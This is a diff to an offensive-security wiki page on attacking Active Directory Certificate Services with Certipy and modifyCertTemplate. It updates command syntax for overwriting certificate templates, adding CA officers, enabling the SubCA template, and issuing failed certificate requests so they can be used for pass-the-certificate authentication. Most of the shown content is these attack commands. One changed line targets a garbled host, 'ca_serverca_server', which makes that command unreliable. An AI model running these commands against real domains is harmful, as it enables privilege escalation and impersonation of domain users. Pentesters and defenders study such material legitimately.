@@ -52,20 +52,20 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can 
 
 ```python
 # 1. Enumerate sensitive access control entries
-certipy 'domain.local'/'user':'password'@'domaincontroller' find
+certipy find 'domain.local'/'user':'password'@'domaincontroller'
 
 # 2. Overwrite the certificate template and save the old configuration
-certipy 'domain.local'/'user':'password'@'domaincontroller' template -template templateName -save-old
+certipy template 'domain.local'/'user':'password'@'ca_server' -template templateName -save-old
 
 # 3. After the ESC1 attack, restore the original configuration
-certipy 'domain.local'/'user':'password'@'domaincontroller' template -template templateName -configuration 'templateName.json'
+certipy template 'domain.local'/'user':'password'@'ca_serverca_server' -template templateName -configuration 'templateName.json'
 ```
 
 If a more precise template modification is needed, [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify each attributes of the template.
 
 ```python
 # 1. Enumerate sensitive access control entries
-certipy 'domain.local'/'user':'password'@'domaincontroller' find
+certipy find 'domain.local'/'user':'password'@'domaincontroller'
 
 # 2. Disable Manager Approval Requirement
 modifyCertTemplate.py -template templateName -value 2 -property mspki-enrollment-flag domain.local/user:password
@@ -131,16 +131,17 @@ This ID can be used by a user with the **ManageCA** _and_ **ManageCertificates**
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object and modify some CA's attributes like the officiers list (an officier is a user with the **ManageCertificate** rights) or the enabled certificate templates.
 
 ```python
-certipy 'domain.local'/'user':'password'@'domaincontroller' find
+# Enumerate sensitive access rights
+certipy find 'domain.local'/'user':'password'@'domain_controller'
 
 # Add a new officier
-certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -add-officier 'user'
+certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -add-officier 'user'
 
 # List all the templates
-certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -list-templates
+certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -list-templates
 
 # Enable a certificate template
-certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -enable-template 'SubCA'
+certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -enable-template 'SubCA'
 ```
 
 {% hint style="info" %}
@@ -188,13 +189,14 @@ DISM.exe /Online /add-capability /CapabilityName:Rsat.CertificateServices.Tools~
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object. Coupled with the **ManageCA** right, it is possible to issue a certificate from a failed request.
 
 ```python
-certipy 'domain.local'/'user':'password'@'domaincontroller' find
+# Enumerate sensitive access rights
+certipy find 'domain.local'/'user':'password'@'domain_controller'
 
 # Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
-certipy 'domain.local'/'user':'password'@'domaincontroller' ca -ca 'ca_name' -issue-request 100
+certipy ca 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -issue-request 100
 
 # Retrieve an issued certificate
-certipy 'domain.local'/'user':'password'@'domaincontroller' req -ca 'ca_name' -request 100
+certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -request 100
 ```
 
 The certificate can then be used with [Pass-The-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
